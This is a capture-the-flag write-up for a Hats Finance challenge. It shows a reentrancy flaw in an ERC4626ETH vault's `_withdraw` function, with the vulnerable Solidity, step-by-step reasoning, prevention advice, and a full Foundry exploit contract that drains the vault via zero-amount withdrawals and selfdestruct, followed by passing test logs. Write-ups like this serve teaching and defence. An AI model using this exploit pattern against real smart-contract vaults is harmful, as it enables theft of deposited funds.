## Tool Used:
Foundry

## Github link:
* Private Repo: https://github.com/pratraut/hats_ctf_challenge2
* GitFront link to share above repo: https://gitfront.io/r/savi0ur/FXrAoJA8szhF/hats-ctf-challenge2-gitfront/

## Solution:

* Contract's `ERC4626ETH.sol` function - `withdraw` OR `redeem` is vulnerable to re-entrancy.
* Both function `withdraw` AND `redeem`, uses `_withdraw` as common function for performing withrawal/redeem operation.
* Inside `_withdraw` function, Its calculating excess ETH by (total_ETH_balance - total_supply_of_VCT_Token) and this excess ETH will be transfer to actual owner of the vault.
* Vulnerable code from `_withdraw` function:
```solidity
uint256 excessETH = totalAssets() - totalSupply();

_burn(_owner, amount);

Address.sendValue(receiver, amount);
if (excessETH > 0) {
    Address.sendValue(payable(owner()), excessETH);
}
```
As we can see, there are two ETH transfers - one with `amount` and other with `excessETH`. If we can somehow put `excessETH` transfer in call stack while doing reentrancy from the external call we got from first ETH transfer i.e., `amount` transfer, we can drain the vault. To get same `excessETH` value for each reentrancy call, we need `amount` to be equal to zero. So that first ETH transfer wont affect the `excessETH` value for each reentrancy call.
* To get an extra ETH in the contract, there are two ways. One way is using `deposit` OR `mint` function, which will mint `VCT` Token and also increasing ETH balance of a vault. Other way is by forcefully transferring ETH to a vault by self-destroying some dummy contract which is having some ETH. This will increase ETH balance in a vault but not VCT Token supply.
* To get some excess ETH to transfer back to owner of the vault, we need to use 2nd way i.e, forcefully transfering ETH by self-destroying contract.
* We can transfer 1 ETH forcefully. So now we have 2 ETH in a vault and 1 VCT Token(owned by original owner of vault).
* To make balance of vault to 0 ETH, so that we can capture the flag, we need to understand below snippet from `_withdraw` function.
```solidity
function _withdraw(
    address caller,
    address payable receiver,
    address _owner,
    uint256 amount
) internal virtual {
    if (caller != _owner) {
        _spendAllowance(_owner, caller, amount);
    }

    uint256 excessETH = totalAssets() - totalSupply();

    _burn(_owner, amount);

    Address.sendValue(receiver, amount);
    if (excessETH > 0) {
        Address.sendValue(payable(owner()), excessETH);
    }

    emit Withdraw(caller, receiver, _owner, amount, amount);
}
```
1. First check - `if (caller != _owner)`, since there is no way to get an approval from actual owner, we need to bypass this check by having `caller == _owner. Both vaules are attacker controlled.
2. `uint256 excessETH = totalAssets() - totalSupply();`- Since we have 2 ETH in vault and 1 VCT Token, we get `excessETH = 2 - 1 = 1`. So we get extra ETH to send it back to vault owner.
3. `_burn(_owner, amount);` - In order to bypass burn function, we need to pass `amount = 0` and `_owner = contract_address_of_attacker`. Hence `caller` should also be an address of the attacker's contract. This `_burn` function will not block us when `amount = 0`.
4. `Address.sendValue(receiver, amount);` - Since `amount` is zero, it will send 0 ETH to reciever, As `Address.sendValue()` function is performing `call` on provided address, we get an external call to receiver, which we can make use to re-enter the vault. So this `receiver` address must be attacker controlled contract address, which will let us use `fallback` function when transfering ETH using `call` function.
5. When `excessETH > 0`, it will transfer excessETH to vault owner, which is decrementing balance of vault in ETH.
```
if (excessETH > 0) {
    Address.sendValue(payable(owner()), excessETH);
}
```
6. After step 4, we will accept the 0 ETH transfer from vault in `fallback` function of attackers contract. Which will keep count on the number of times we need to call `withdraw` function to transfer all 2 ETH from contract. In this case it need to call one more time. Since during first `_withdraw` call, transfer of 1st ETH is stored inside call stack. In second call of `withdraw` from fallback function, it will store 2nd ETH transfer inside call stack. After this, no need to re-enter `withdraw` function. Once it will execute, all two transfer from call stack, all 2 ETH are sent to vault owner.
7. Once balance of vault is zero, we can call `captureTheFlag` function with attacker address.

**Note:** Here we have used 1 ETH for forcefull transfer to get `excessETH` of 1 ETH. But we can also use lower ETH (< 1 ETH), say `0.1 ETH`, so we get `0.1 ETH` as `excessETH`. Now we have to re-enter, `1 ETH / 0.1 ETH = 10` times.

## Prevention:
This vulnerability can be prevented by two ways:
* Using `ReentrancyGuard` for vulnerable function `withdraw` OR `redeem`.
* Having check for `assets` OR `shares` parameter of `withdraw` and `redeem` function respectively to be greater than zero.


## Exploit contract:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

interface IVault {
    function withdraw(
        uint256 assets,
        address receiver,
        address owner
    ) external returns (uint256);
    function captureTheFlag(address newFlagHolder) external;
    function flagHolder() external returns (address);
}

contract SelfDestructable {
    constructor() public payable {}
    function destruct(address to) public {
        selfdestruct(payable(to));
    }
}

contract Attacker {
    IVault vault;
    uint cnt = 0;   // Counter to keep track of number of calls for reentrancy

    constructor(address victim) public payable {
        vault = IVault(victim);
    }

    // Fallback function to receive external call from vault contract
    fallback() external payable {
        if (msg.value == 0) {
            cnt += 1;
        }
        if (cnt <= 1) {
            vault.withdraw(0 ether, address(this), address(this));
        }
    }

    function attack(address flagHolder) public {
        // Forcefully transfer 1 ETH to vault by selfdestructing
        SelfDestructable d = new SelfDestructable{value: 1 ether}();
        d.destruct(address(vault));

        // Calling withdraw on vault with assets = 0 and receiver = attackers contract address
        vault.withdraw(0 ether, address(this), address(this));
        require(address(vault).balance == 0, "vault balance is not zero");
        // Capture the flag, at this moment vault balance is zero        
        vault.captureTheFlag(flagHolder);
        console.log("Flag Holder =", vault.flagHolder());
    }
}
contract CTFTest is Test {
    function setUp() public {       
    }

    function testExploit() public {
        // Vault Address
        address victim = 0x8043e6836416d13095567ac645be7C629715885c;
        // Loading vault with 1 ETH
        vm.deal(victim, 1 ether);
        // Attackers EOA Address
        address attacker_eoa = 0xF5BED21BD285CBe352737F686766cCC19BeE7acC;
        // Loading attackers EOA with 1 ETH
        vm.deal(attacker_eoa, 1 ether);
        // All calls will go from attackers EOA
        vm.startPrank(attacker_eoa);
        console.log("Balance before victim:      ", victim.balance);
        console.log("Balance before attacker EOA:", attacker_eoa.balance);
        // Deploying attacker's contract
        Attacker attacker = new Attacker{value: 1 ether}(victim);
        console.log("Balance before attacker:    ", address(attacker).balance);
        
        // Starting the attack
        attacker.attack(attacker_eoa);

        console.log("Balance after victim:      ", victim.balance);
        console.log("Balance after attacker EOA:", attacker_eoa.balance);
        console.log("Balance after attacker:    ", address(attacker).balance);

        // Check to see if attack is successfull
        assertEq(victim.balance, 0);
    }
}
```
### Command to run - fork environment: 
`forge test -c ./test/CTF.t.sol --fork-url https://ethereum-goerli-rpc.allthatnode.com -vvvv`
```console
Running 1 test for test/CTF.t.sol:CTFTest
[PASS] testExploit() (gas: 501031)
Logs:
  Balance before victim:       1000000000000000000
  Balance before attacker EOA: 1000000000000000000
  Balance before attacker:     1000000000000000000
  Flag Holder = 0xF5BED21BD285CBe352737F686766cCC19BeE7acC
  Balance after victim:       0
  Balance after attacker EOA: 0
  Balance after attacker:     0
```
